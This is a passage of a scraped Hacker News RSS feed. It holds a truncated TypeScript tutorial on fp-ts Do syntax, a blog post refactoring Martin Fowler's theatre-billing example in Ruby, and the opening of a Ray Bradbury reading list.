  <span>.</span><span>bind</span><span>(</span><span>"user"</span><span>,</span> <span>some</span><span>(</span><span>{</span>name<span>:</span> <span>"Bob"</span><span>,</span> age<span>:</span> <span>54</span><span>}</span><span>)</span><span>)</span>
  <span>.</span><span>bind</span><span>(</span><span>"manager"</span><span>,</span> <span>some</span><span>(</span><span>{</span>name<span>:</span> <span>"April"</span><span>,</span> age<span>:</span> <span>46</span><span>}</span><span>)</span><span>)</span>
  <span>.</span><span>return</span><span>(</span><span>context</span> <span>=&gt;</span> <span>{</span>
    context<span>.</span>user 
    context<span>.</span>manager 
  <span>}</span><span>)</span></code></pre>
      </div><h2 id="do"><a href="#do">.do</a></h2><p><code>.do</code> is similar to <code>bind</code>, except you don't pass an identifier, and the resulting value isn't stored in the context. </p><div data-language="ts">
      <pre><code><span>declare</span> <span>function</span> <span>findManagerFor</span><span>(</span><span>name<span>:</span> <span>string</span></span><span>)</span><span>:</span> Option<span>&lt;</span>User<span>&gt;</span>
<span>Do</span><span>(</span>option<span>)</span>
  <span>.</span><span>bind</span><span>(</span><span>"user"</span><span>,</span> <span>some</span><span>(</span><span>{</span>name<span>:</span> <span>"Bob"</span><span>,</span> age<span>:</span> <span>54</span><span>}</span><span>)</span><span>)</span>
  <span>.</span><span>do</span><span>(</span><span>findManagerFor</span><span>(</span><span>"Bob"</span><span>)</span><span>)</span>
  <span>.</span><span>return</span><span>(</span><span>context</span> <span>=&gt;</span> <span>{</span>
    context<span>.</span>user 
  <span>}</span><span>)</span></code></pre>
      </div><p>We'd use <code>do</code> here if we only cared that a manager for <code>Bob</code> existed, and not any details about that manager.</p><h2 id="sequence-s"><a href="#sequence-s">.sequenceS</a></h2><p><code>sequenceS</code> (like <code>bind</code>) also extracts values, but underneath the hood uses <code>ap</code> instead of <code>chain</code>, which allows you to combine values in "parallel." One place this is useful is when validating data:</p><div data-language="ts">
      <pre><code>
<span>const</span> startTime<span>:</span> <span>string</span> <span>=</span> <span>"2020-03-27T02:00:00Z"</span>
<span>const</span> endTime<span>:</span> <span>string</span> <span>=</span> <span>"2020-03-27T02:30:00Z"</span>


<span>const</span> validation <span>=</span> <span>getValidation</span><span>(</span>getMonoid<span>&lt;</span><span>string</span><span>&gt;</span><span>(</span><span>)</span><span>)</span>


<span>function</span> <span>isDate</span><span>(</span><span>isoString<span>:</span> <span>string</span></span><span>)</span><span>:</span> Either<span>&lt;</span><span>string</span><span>[</span><span>]</span><span>,</span> Date<span>&gt;</span> <span>{</span><span>...</span><span>}</span>

<span>const</span> result <span>=</span>
  <span>Do</span><span>(</span>validation<span>)</span>
    <span>.</span><span>sequenceS</span><span>(</span><span>{</span>
      start<span>:</span> <span>isDate</span><span>(</span>startTime<span>)</span><span>,</span>
      end<span>:</span> <span>isDate</span><span>(</span>endTime<span>)</span>
    <span>}</span><span>)</span>
    <span>.</span><span>return</span><span>(</span><span>context</span> <span>=&gt;</span> <span>{</span>
      context<span>.</span>start 
      context<span>.</span>end   
    <span>}</span><span>)</span></code></pre>
      </div><p>Since we've used <code>sequenceS</code> here, If both <code>startTime</code> and <code>endTime</code> are invalid, <code>result</code> will be a <code>Left</code> containing <em>both</em> of the errors. This is because <code>.sequenceS</code> uses <code>validation</code>'s <code>ap</code>, and <code>.bind</code> uses <code>chain</code>. Consider if we used <code>bind</code> instead:</p><div data-language="ts">
      <pre><code><span>const</span> result <span>=</span>
  <span>Do</span><span>(</span>validation<span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"start"</span><span>,</span> <span>isDate</span><span>(</span>startTime<span>)</span><span>)</span>
    <span>.</span><span>bind</span><span>(</span><span>"end"</span><span>,</span> <span>isDate</span><span>(</span>endTime<span>)</span><span>)</span>
    <span>.</span><span>return</span><span>(</span><span>context</span> <span>=&gt;</span> <span>{</span>
      context<span>.</span>start 
      context<span>.</span>end   
    <span>}</span><span>)</span></code></pre>
      </div><p>In this example, if <code>startTime</code> and <code>endTime</code> are invalid, then <code>result</code> will only contain the error from checking <code>startTime</code>, since <code>chain</code> short-circuits.</p><h2 id="let"><a href="#let">.let</a></h2><p><code>let</code> is the simplest of these, and just allows us to introduce identifiers without breaking the expression:</p><div data-language="ts">
      <pre><code><span>Do</span><span>(</span>option<span>)</span>
  <span>.</span><span>bind</span><span>(</span><span>"user"</span><span>,</span> <span>some</span><span>(</span><span>{</span>name<span>:</span> <span>"Bob"</span><span>,</span> age<span>:</span> <span>54</span><span>}</span><span>)</span><span>)</span>
  <span>.</span><span>let</span><span>(</span><span>"count"</span><span>,</span> <span>1</span><span>)</span>
  <span>.</span><span>return</span><span>(</span><span>context</span> <span>=&gt;</span> <span>{</span>
    context<span>.</span>count 
  <span>}</span><span>)</span></code></pre>
      </div><h2 id="do-l-bind-l-sequence-sl-let-l-variants"><a href="#do-l-bind-l-sequence-sl-let-l-variants">.doL/.bindL/.sequenceSL/.letL variants</a></h2><p>Each of the above methods has an <code>L</code> variant, <code>.doL</code>, <code>.bindL</code>, <code>.sequenceSL</code>, and <code>.letL</code>. These variants work exactly like their counterparts, except that the second parameter is a function (lamda, hence the <code>L</code> suffix) which returns the monad value. The parameter to the function is the context object that <code>Do</code> maintains. This makes it easy to extract &amp; chain monads whose values depend on extracted values from previous steps in the chain.</p><p>Here's an adaption of the date validation example from above. Let's suppose that we also want to validate that the <code>startTime</code> is <em>before</em> <code>endTime</code>. For that, we'll need the actual <code>Date</code> values that are extracted from the ISO values. This can only happen if we've succesfully validated the <code>startTime</code> and <code>endTime</code> ISO strings, though:</p><div data-language="ts">
      <pre><code>
<span>declare</span> <span>const</span> startTime<span>:</span> <span>string</span>
<span>declare</span> <span>const</span> endTime<span>:</span> <span>string</span>


<span>declare</span> <span>function</span> <span>isDate</span><span>(</span><span>isoString<span>:</span> <span>string</span></span><span>)</span><span>:</span> Either<span>&lt;</span><span>string</span><span>[</span><span>]</span><span>,</span> Date<span>&gt;</span>

<span>declare</span> <span>function</span> <span>startIsBeforeEnd</span><span>(</span><span>start<span>:</span> Date<span>,</span> end<span>:</span> Date</span><span>)</span><span>:</span> Either<span>&lt;</span><span>string</span><span>[</span><span>]</span><span>,</span> <span>number</span><span>&gt;</span>

<span>const</span> result <span>=</span>
  <span>Do</span><span>(</span>validation<span>)</span>
    <span>.</span><span>sequenceS</span><span>(</span><span>{</span> 
      start<span>:</span> <span>isDate</span><span>(</span>startTime<span>)</span><span>,</span>
      end<span>:</span> <span>isDate</span><span>(</span>end…</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://paulgray.net/do-syntax-in-typescript/">https://paulgray.net/do-syntax-in-typescript/</a></em></p>]]>
            </description>
            <link>https://paulgray.net/do-syntax-in-typescript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23699385</guid>
            <pubDate>Wed, 01 Jul 2020 08:56:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Get your code reviewed by Martin Fowler, kinda]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23699310">thread link</a>) | @_ketanbhatt
<br/>
July 1, 2020 | https://ketanbhatt.com/martin-fowler-refactoring-code-review/ | <a href="https://web.archive.org/web/*/https://ketanbhatt.com/martin-fowler-refactoring-code-review/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>June 30, 2020<!-- --> <!-- -->•<!-- --> <span>programming</span></p></header><section><p>I picked up <a href="https://martinfowler.com/books/refactoring.html">Refactoring, by Martin Fowler</a>, and I am learning a lot. The book is written like a catalogue that you can refer back to later. And, for those who are seeking, <strong>the book is an excellent chance to get your code reviewed by Martin Fowler!!</strong> 😮</p>
<p>Martin starts the book with an example that he goes on to refactor in the first chapter. Sensing an insane opportunity, I stopped right away and copied this original code in Ruby. I then went ahead, wrote down my thoughts and refactored the code like I would if it was an actual thing I was working on. Once I was done, I went back to the book and compared Martin’s notes against mine, and learnt from his thought process and code. I think this is the best way to read this chapter.</p>
<p>If you are someone who enjoys this, I highly recommend you give this a try too. And if not the book, use this blog to power your review.</p>

<p><strong><em>(Psssst… You can find the full original code here: <a href="https://github.com/ketanbhatt/refactoring-rb/tree/master/chapter-1/a_first_example/original">Github</a>)</em></strong></p>
<p>We have a Theatre Company that perform plays in events. They charge customers based on the type of the play, and also provide a “Volume Credit” for future discounts. The Company stores data about their plays (<a href="https://github.com/ketanbhatt/refactoring-rb/blob/master/chapter-1/a_first_example/original/plays.json">plays.json</a>) and bills (<a href="https://github.com/ketanbhatt/refactoring-rb/blob/master/chapter-1/a_first_example/original/invoices.json">invoices.json</a>) in JSON files.</p>
<p>The simple code below is used to print a bill from an invoice. This is the code we will attempt to refactor. Assume that this code is part of a much larger system and we are refactoring while adding a feature to print bills in HTML. Moreover, the Company has plans to perform more types of plays in the future.</p>
<div data-language="ruby"><pre><code>

<span>require</span> <span>'json'</span>

<span>def</span> <span><span>statement</span></span><span>(</span>invoice<span>,</span> plays<span>)</span>
  total_amount <span>=</span> <span>0</span>
  volume_credits <span>=</span> <span>0</span>
  result <span>=</span> <span>"Statement for <span><span>#{</span>invoice<span>[</span><span>'customer'</span><span>]</span><span>}</span></span>\n"</span>

  invoice<span>[</span><span>'performances'</span><span>]</span><span>.</span><span>each</span> <span>do</span> <span>|</span>perf<span>|</span>
    play <span>=</span> plays<span>[</span>perf<span>[</span><span>'playID'</span><span>]</span><span>]</span>

    this_amount <span>=</span> <span>0</span>

    <span>case</span> play<span>[</span><span>'type'</span><span>]</span>
    <span>when</span> <span>'tragedy'</span>
      this_amount <span>=</span> <span>40000</span>
      <span>if</span> perf<span>[</span><span>'audience'</span><span>]</span> <span>&gt;</span> <span>30</span>
        this_amount <span>+</span><span>=</span> <span>1000</span> <span>*</span> <span>(</span>perf<span>[</span><span>'audience'</span><span>]</span> <span>-</span> <span>30</span><span>)</span>
      <span>end</span>
    <span>when</span> <span>'comedy'</span>
      this_amount <span>=</span> <span>30000</span>
      <span>if</span> perf<span>[</span><span>'audience'</span><span>]</span> <span>&gt;</span> <span>20</span>
        this_amount <span>+</span><span>=</span> <span>10000</span> <span>+</span> <span>500</span> <span>*</span> <span>(</span>perf<span>[</span><span>'audience'</span><span>]</span> <span>-</span> <span>20</span><span>)</span>
      <span>end</span>
      this_amount <span>+</span><span>=</span> <span>300</span> <span>*</span> perf<span>[</span><span>'audience'</span><span>]</span>
    <span>else</span>
      <span>raise</span> <span>Exception</span><span>(</span><span>"Unknown type: <span><span>#{</span>play<span>[</span><span>'type'</span><span>]</span><span>}</span></span>"</span><span>)</span>
    <span>end</span>

    volume_credits <span>+</span><span>=</span> <span>[</span>perf<span>[</span><span>'audience'</span><span>]</span> <span>-</span> <span>30</span><span>,</span> <span>0</span><span>]</span><span>.</span>max
    
    <span>if</span> <span>'comedy'</span> <span>==</span> play<span>[</span><span>'type'</span><span>]</span>
      volume_credits <span>+</span><span>=</span> <span>(</span>perf<span>[</span><span>'audience'</span><span>]</span> <span>/</span> <span>5</span><span>)</span><span>.</span>floor
    <span>end</span>

    result <span>+</span><span>=</span> <span>"  <span><span>#{</span>play<span>[</span><span>'name'</span><span>]</span><span>}</span></span>: $<span><span>#{</span>this_amount <span>/</span> <span>100</span><span>}</span></span> (<span><span>#{</span>perf<span>[</span><span>'audience'</span><span>]</span><span>}</span></span> seats)\n"</span>
    total_amount <span>+</span><span>=</span> this_amount
  <span>end</span>

  result <span>+</span><span>=</span> <span>"Amount owed is $<span><span>#{</span>total_amount <span>/</span> <span>100</span><span>}</span></span>\n"</span>
  result <span>+</span><span>=</span> <span>"You earned <span><span>#{</span>volume_credits<span>}</span></span> credits\n"</span>
<span>end</span>

plays_json <span>=</span> <span>JSON</span><span>.</span>parse<span>(</span><span>File</span><span>.</span>read<span>(</span><span>"./plays.json"</span><span>)</span><span>)</span>
invoices_json <span>=</span> <span>JSON</span><span>.</span>parse<span>(</span><span>File</span><span>.</span>read<span>(</span><span>"./invoices.json"</span><span>)</span><span>)</span>
result <span>=</span> statement<span>(</span>invoices_json<span>.</span>first<span>,</span> plays_json<span>)</span>
puts result</code></pre></div>
<h4 id="output"><a href="#output" aria-label="output permalink"></a>output</h4>
<div data-language="text"><pre><code>Statement for
  Hamlet: $650 (55 seats)
  As You Like It: $580 (35 seats)
  Othello: $500 (40 seats)
Amount owed is $1730
You earned 47 credits</code></pre></div>
<h4 id="note-if-you-are-planning-to-do-this-yourself-first-stop-here-come-back-once-you-have-refactored-the-original-code"><a href="#note-if-you-are-planning-to-do-this-yourself-first-stop-here-come-back-once-you-have-refactored-the-original-code" aria-label="note if you are planning to do this yourself first stop here come back once you have refactored the original code permalink"></a>Note: If you are planning to do this yourself first, stop here. Come back once you have refactored the original code.</h4>

<p><strong><em>(Psssst… You can find the refactored code here: <a href="https://github.com/ketanbhatt/refactoring-rb/tree/master/chapter-1/a_first_example/ketanbhatt">Github</a>)</em></strong></p>
<p>Reading through the code, this is what stood out for me:</p>
<ol>
<li>The <code>statement</code> method returns a formatted text right now. I would like it to return a structured statement that I can format later as I wish, for example: for sending Slack notifications, emails. Additionally, it simplifies writing tests for this and the formatter methods.</li>
<li>The code that adds extra <code>volume_credits</code> for <code>comedy</code> plays, the comment states that we add extra credit for every “10” attendees, but the code adds a credit for every “5” attendees. Either this comment has gone stale, or there is a bug in the code. Either way, we can make the code more readable and remove the comment. (Aside: I like <a href="http://antirez.com/news/124">antirez’s blog about writing comments</a> a lot.)</li>
<li>Overall, it is difficult to understand what is going on in the code. I think we can make it more readable easily.</li>
<li>The method is doing too much, calculating <code>volume_credit</code> and <code>amount</code> for each type of play, and creating the text. It would be better if I can hand over this calculation to a different class that would do the needful, and my method just creates the text.</li>
<li>Because of this “doing too much”, the code has become messy. It will become still messier if the calculation was different for each Play too (and not same for Plays of the same type).</li>
<li>Also, looks like that the calculation is in cents and is being converted to dollars in the text. The code should make this explicit. Maybe I could rename the variable to be <code>amount_in_cents</code>?</li>
<li>The code right now assumes <code>audience</code> to be present and to be a number. Maybe we should put in validations that <code>asserts</code> for this truth? Although it seems out of scope for our current exercise.</li>
</ol>

<p>I moved the code for calculating amount and volume credits to a different class and file. I also separated the calculation for the two types of plays.</p>
<p>In the future, adding new play types will just need a new class to be added.</p>
<div data-language="ruby"><pre><code>

<span>class</span> <span>PlayTypeBaseStatementCalculator</span>
  <span>def</span> <span><span>initialize</span></span><span>(</span>play_id<span>:</span><span>,</span> audience<span>:</span><span>)</span>
    <span>@play_id</span> <span>=</span> play_id
    <span>@audience</span> <span>=</span> audience
  <span>end</span>

  <span>def</span> <span><span>amount</span></span>
    <span>raise</span> <span>NotImplementedError</span>
  <span>end</span>

  <span>def</span> <span><span>volume_credits</span></span>
    <span>raise</span> <span>NotImplementedError</span>
  <span>end</span>
<span>end</span>

<span>class</span> <span>TragedyStatementCalculator</span> <span>&lt;</span> <span>PlayTypeBaseStatementCalculator</span>
  <span>.</span><span>.</span><span>.</span>
<span>end</span>

<span>class</span> <span>ComedyStatementCalculator</span> <span>&lt;</span> <span>PlayTypeBaseStatementCalculator</span>
  <span>.</span><span>.</span><span>.</span>
<span>end</span></code></pre></div>
<br>
I also implemented the calculation in a more verbose manner. I think this improves the readability of the code.
<div data-language="ruby"><pre><code>

<span>.</span><span>.</span><span>.</span>

<span>class</span> <span>TragedyStatementCalculator</span> <span>&lt;</span> <span>PlayTypeBaseStatementCalculator</span>
  <span>def</span> <span><span>amount</span></span>
    fixed_charge <span>=</span> <span>40</span>_000
    total_additional_charge <span>=</span> <span>0</span>

    included_attendee_count <span>=</span> <span>30</span>
    charge_per_extra_person <span>=</span> <span>1000</span>

    <span>if</span> <span>@audience</span> <span>&gt;</span> included_attendee_count
      extra_attendee <span>=</span> <span>@audience</span> <span>-</span> included_attendee_count
      total_additional_charge <span>+</span><span>=</span> charge_per_extra_person <span>*</span> extra_attendee
    <span>end</span>

    fixed_charge <span>+</span> total_additional_charge
  <span>end</span>

  <span>def</span> <span><span>volume_credits</span></span>
    min_attendee_count <span>=</span> <span>30</span>

    <span>@audience</span> <span>&gt;</span> min_attendee_count <span>?</span> <span>@audience</span> <span>-</span> <span>30</span> <span>:</span> <span>0</span>
  <span>end</span>
<span>end</span>

<span>class</span> <span>ComedyStatementCalculator</span> <span>&lt;</span> <span>PlayTypeBaseStatementCalculator</span>
  <span>def</span> <span><span>amount</span></span>
    fixed_charge <span>=</span> <span>30</span>_000
    additional_charge_per_person <span>=</span> <span>300</span>
    total_additional_charge <span>=</span> additional_charge_per_person <span>*</span> <span>@audience</span>

    included_attendee_count <span>=</span> <span>20</span>
    charge_per_extra_person <span>=</span> <span>500</span>
    additional_fixed_charge_if_extra_attendee <span>=</span> <span>10</span>_000

    <span>if</span> <span>@audience</span> <span>&gt;</span> included_attendee_count
      extra_attendee <span>=</span> <span>@audience</span> <span>-</span> included_attendee_count
      total_additional_charge <span>+</span><span>=</span> <span>(</span>charge_per_extra_person <span>*</span> extra_attendee<span>)</span> <span>+</span> additional_fixed_charge_if_extra_attendee
    <span>end</span>

    fixed_charge <span>+</span> total_additional_charge
  <span>end</span>

  <span>def</span> <span><span>volume_credits</span></span>
    min_attendee_count <span>=</span> <span>30</span>
    extra_credit_for_every_n_attendee <span>=</span> <span>5</span>

    credits <span>=</span> <span>@audience</span> <span>&gt;</span> min_attendee_count <span>?</span> <span>@audience</span> <span>-</span> <span>30</span> <span>:</span> <span>0</span>
    credits <span>+</span><span>=</span> <span>(</span><span>@audience</span> <span>/</span> extra_credit_for_every_n_attendee<span>)</span><span>.</span>floor

    credits
  <span>end</span>
<span>end</span></code></pre></div>
<h3 id="return-the-right-calculator-for-a-play"><a href="#return-the-right-calculator-for-a-play" aria-label="return the right calculator for a play permalink"></a>Return the right calculator for a Play</h3>
<p>I wanted to separate out the logic behind fetching the right calculator for a play, so I created a getter for it.</p>
<div data-language="ruby"><pre><code>

<span>.</span><span>.</span><span>.</span>

<span>def</span> <span><span>get_calculator</span></span><span>(</span>play<span>,</span> performance<span>)</span>
  audience <span>=</span> performance<span>[</span><span>'audience'</span><span>]</span>
  play_id <span>=</span> performance<span>[</span><span>'play_id'</span><span>]</span>

  <span>case</span> play<span>[</span><span>'type'</span><span>]</span>
  <span>when</span> <span>'tragedy'</span>
    <span>TragedyStatementCalculator</span><span>.</span><span>new</span><span>(</span>play_id<span>:</span> play_id<span>,</span> audience<span>:</span> audience<span>)</span>
  <span>when</span> <span>'comedy'</span>
    <span>ComedyStatementCalculator</span><span>.</span><span>new</span><span>(</span>play_id<span>:</span> play_id<span>,</span> audience<span>:</span> audience<span>)</span>
  <span>else</span>
    <span>raise</span> <span>Exception</span>
  <span>end</span>
<span>end</span></code></pre></div>
<h3 id="calculate-the-statement"><a href="#calculate-the-statement" aria-label="calculate the statement permalink"></a>Calculate the Statement</h3>
<p>Keeping calculation out of the formatting logic, I created a method that loops over the invoices, and generates a structure containing information about the bill.</p>
<p>This structured statement can now be used by any formatter.</p>
<div data-language="ruby"><pre><code>

<span>.</span><span>.</span><span>.</span>

<span>def</span> <span><span>calculate_statement</span></span><span>(</span>invoice<span>,</span> plays<span>)</span>
  statement_hash <span>=</span> <span>{</span> performances<span>:</span> <span>[</span><span>]</span> <span>}</span>

  invoice<span>[</span><span>'performances'</span><span>]</span><span>.</span><span>each</span> <span>do</span> <span>|</span>performance<span>|</span>
    play_id <span>=</span> performance<span>[</span><span>'playID'</span><span>]</span>
    play <span>=</span> plays<span>[</span>play_id<span>]</span>

    calculator <span>=</span> get_calculator<span>(</span>play<span>,</span> performance<span>)</span>

    statement_hash<span>[</span><span>:performances</span><span>]</span><span>.</span>push<span>(</span>
      <span>{</span>
        play_id<span>:</span> play_id<span>,</span>
        play_name<span>:</span> play<span>[</span><span>'name'</span><span>]</span><span>,</span>
        audience<span>:</span> performance<span>[</span><span>'audience'</span><span>]</span><span>,</span>
        amount<span>:</span> calculator<span>.</span>amount<span>,</span>
        volume_credits<span>:</span> calculator<span>.</span>volume_credits<span>,</span>
      <span>}</span>
    <span>)</span>
  <span>end</span>

  statement_hash<span>[</span><span>:customer</span><span>]</span> <span>=</span> invoice<span>[</span><span>'customer'</span><span>]</span>
  statement_hash<span>[</span><span>:total_amount</span><span>]</span> <span>=</span> statement_hash<span>[</span><span>:performances</span><span>]</span><span>.</span>reduce<span>(</span><span>0</span><span>)</span> <span>{</span> <span>|</span>sum<span>,</span> perf<span>|</span> sum <span>+</span> perf<span>[</span><span>:amount</span><span>]</span> <span>}</span>
  statement_hash<span>[</span><span>:total_volume_credits</span><span>]</span> <span>=</span> statement_hash<span>[</span><span>:performances</span><span>]</span><span>.</span>reduce<span>(</span><span>0</span><span>)</span> <span>{</span> <span>|</span>sum<span>,</span> perf<span>|</span> sum <span>+</span> perf<span>[</span><span>:volume_credits</span><span>]</span> <span>}</span>

  statement_hash
<span>end</span></code></pre></div>
<h3 id="finally-generate-the-bill"><a href="#finally-generate-the-bill" aria-label="finally generate the bill permalink"></a>Finally, generate the Bill</h3>
<p>The original <code>statement</code> method is now <code>text_statement</code> and all it does is format the bill as needed. A new method, <code>html_statement</code> can now be defined similarly to format the bill in HTML.</p>
<div data-language="ruby"><pre><code>

<span>require</span> <span>'json'</span>

<span>require</span> <span>'./statement_calculators'</span>

<span>def</span> <span><span>text_statement</span></span><span>(</span>invoice<span>,</span> plays<span>)</span>
  statement_data <span>=</span> calculate_statement<span>(</span>invoice<span>,</span> plays<span>)</span>

  lines <span>=</span> <span>[</span><span>"Statement for <span><span>#{</span>statement_data<span>[</span><span>'customer'</span><span>]</span><span>}</span></span>"</span><span>]</span>

  statement_data<span>[</span><span>:performances</span><span>]</span><span>.</span><span>each</span> <span>do</span> <span>|</span>perf<span>|</span>
    lines<span>.</span>push<span>(</span><span>"  <span><span>#{</span>perf<span>[</span><span>:play_name</span><span>]</span><span>}</span></span>: $<span><span>#{</span>perf<span>[</span><span>:amount</span><span>]</span> <span>/</span> <span>100</span><span>}</span></span> (<span><span>#{</span>perf<span>[</span><span>:audience</span><span>]</span><span>}</span></span> seats)"</span><span>)</span>
  <span>end</span>

  lines<span>.</span>push<span>(</span><span>"Amount owed is $<span><span>#{</span>statement_data<span>[</span><span>:total_amount</span><span>]</span> <span>/</span> <span>100</span><span>}</span></span>"</span><span>)</span>
  lines<span>.</span>push<span>(</span><span>"You earned <span><span>#{</span>statement_data<span>[</span><span>:total_volume_credits</span><span>]</span><span>}</span></span> credits"</span><span>)</span>

  lines<span>.</span>join<span>(</span><span>"\n"</span><span>)</span>
<span>end</span>

<span>def</span> <span><span>html_statement</span></span><span>(</span>invoice<span>,</span> plays<span>)</span>
  <span>nil</span>
<span>end</span></code></pre></div>
<br>
I will call the refactoring done at this point.
<div><p>Although, I can’t seem to shake off this feeling that there is something more that can be done. I don’t think I am completely happy with the changes 😕 Let’s see what Sir Martin has to say.
</p></div>
<center>
<p><img src="https://media.giphy.com/media/vA4EnqvJxDv2g/giphy.gif" alt="Excited Anticipation GIF"></p>
</center>

<p>The process that Martin followed for refactoring the original code, in his words, was:</p>
<blockquote>
<ol>
<li>Decomposing the original function into a set of nested functions</li>
<li>Separate calculating and printing code, the two phases.</li>
<li>Introducing a polymorphic calculator for the calculation logic.</li>
</ol>
</blockquote>

<p>From what I have learnt in this chapter, in the <strong>hypothetical scenario</strong> in which Martin Fowler does a code review of my changes, this is what he would have to say:</p>
<ol>
<li><em>“I like that you are using an intermediate structure to pass the calculation …</em></li></ol></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ketanbhatt.com/martin-fowler-refactoring-code-review/">https://ketanbhatt.com/martin-fowler-refactoring-code-review/</a></em></p>]]>
            </description>
            <link>https://ketanbhatt.com/martin-fowler-refactoring-code-review/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23699310</guid>
            <pubDate>Wed, 01 Jul 2020 08:45:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: With my site InSeason you always know what food is seasonal (europeans)]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23698691">thread link</a>) | @l1am0
<br/>
July 1, 2020 | https://simon-frey.com/inseason/ | <a href="https://web.archive.org/web/*/https://simon-frey.com/inseason/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://simon-frey.com/inseason/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23698691</guid>
            <pubDate>Wed, 01 Jul 2020 07:17:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Essential Bradbury (2018)]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 5 (<a href="https://news.ycombinator.com/item?id=23697573">thread link</a>) | @benbreen
<br/>
June 30, 2020 | http://www.samweller.net/bradbury-1/2018/11/29/the-essential-bradbury | <a href="https://web.archive.org/web/*/http://www.samweller.net/bradbury-1/2018/11/29/the-essential-bradbury">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site">
		<div id="canvas">

			<!-- / headerWrapper -->

			<div id="pageWrapper" role="main">
				<section id="page" data-content-field="main-content">
					<article id="article-5c00433721c67cb58a2c167d" data-item-id="5c00433721c67cb58a2c167d">

	<div>
  <!--SPECIAL CONTENT-->

    

    <div>

    <!--POST HEADER-->

			<header>
				
				
			</header>

    <!--POST BODY-->

      <div><div data-layout-label="Post Body" data-type="item" data-updated-on="1543522407246" id="item-5c00433721c67cb58a2c167d"><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1543547389304_16960"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1543547495524-6SIUICX8KG62CPH06EUU/ke17ZwdGBToddI8pDm48kKY1mPzO9GKw7DK2Ogj0DkFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7SSwGn0TPzISNt3iSJufpctWMnaO_L-40UsXd4K4jrErboZrhY-qn3mDP5uwEjQu4Q/1.png" data-image="https://images.squarespace-cdn.com/content/v1/57d19f2f8419c29c4c3d9b82/1543547495524-6SIUICX8KG62CPH06EUU/ke17ZwdGBToddI8pDm48kKY1mPzO9GKw7DK2Ogj0DkFZw-zPPgdn4jUwVcJE1ZvWhcwhEtWJXoshNdA9f1qD7SSwGn0TPzISNt3iSJufpctWMnaO_L-40UsXd4K4jrErboZrhY-qn3mDP5uwEjQu4Q/1.png" data-image-dimensions="250x398" data-image-focal-point="0.5,0.5" alt="1.png" data-load="false" data-image-id="5c00aa30758d46f1d3c3a3c0" data-type="image" src="http://www.samweller.net/bradbury-1/2018/11/29/1.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-32e240a0acc2fe970f20"><div><p>When the first edition of <em>Listen to the Echoes: The Ray Bradbury Interviews </em>was published in June of 2010, I embarked upon an overly-ambitious project. I began a series on my blog titled “The Essential Bradbury,” where I intended on listing the 25 must-read Ray Bradbury short stories for any would-be Martian-neophytes. I listed out each story, its history, themes, and what made the tale top-shelf Bradbury. Over the next few years, I made it all the way to 18 stories! But, then, the old web site came down as <a href="https://hatandbeard.com/products/listen-to-the-echoes-the-ray-bradbury-interviews"><em>Listen to the Echoes</em></a> was published in a handsome new edition by a new publisher and, alas, I never completed the 25 “Essential Bradbury” stories.</p><p>So here I go again! Fans have been writing me, asking if I would re-post the old story suggestions and, at long last, finish the project. And so it begins. I figure I only have seven more stories to write about! I have reordered many of my choices. I will be counting down from 25 to number 1 over the next few weeks. </p><p>People often ask, "where should I begin when it comes to reading Bradbury?"</p><p>The long answer? In 2010, Everyman's Library republished <a href="https://www.amazon.com/Stories-Bradbury-Everymans-Contemporary-Classics/dp/0307269051/ref=sr_1_1?ie=UTF8&amp;qid=1543608624&amp;sr=8-1&amp;keywords=the+stories+of+ray+bradbury"><em>The Stories of Ray Bradbury</em></a><em> </em>containing a staggering 100 of Bradbury's best short stories. Along with this, there is the equally voluminous <a href="https://www.amazon.com/Bradbury-Stories-Most-Celebrated-Tales/dp/0060544880/ref=sr_1_1?ie=UTF8&amp;qid=1543608705&amp;sr=8-1&amp;keywords=bradbury+stories"><em>Bradbury Stories</em></a>, published in 2003, containing&nbsp;yet another 100 more short fictional gems. (Bradbury dedicated this last book, in part to me, an incredible, stirring gift.) Certainly, you cannot go wrong by reading either of these spectacular volumes. Bradbury is a master of the short story.&nbsp; It is, in my estimation, his strongest creative form. His wife of 56 years, Marguerite, agreed with me. Yet reading 200 stories is, for many, an unrealistic goal.</p><div><p>So the short answer of where to begin with Bradbury is this list, right here. I will offer up a streamlined list of 25 of my own personal favorite short fictions by the master of miracles. These stories will embody all the trademarks of vintage Bradbury: the lyrical language; the fantastic, original, and memorable ideas; the rich metaphor; and endings that sometimes surprise, sometimes sadden, always instruct and entertain. This list will be entirely subjective. These are my favorites. They will reflect a wide range, from weird tales to social science fiction to quiet and contemplative tales of contemporary literature. These tales are pure and classic Bradbury—our modern mythologist.</p><p><strong>#25 “THE FIRST NIGHT OF LENT”</strong></p></div><p><span>Where to Find It</span>: <em>A Medicine for Melancholy,</em> <em>The Stories of Ray Bradbury</em></p><p><span>First Published</span>: <em>Playboy, March, 1956</em></p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1550443716450_14171"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
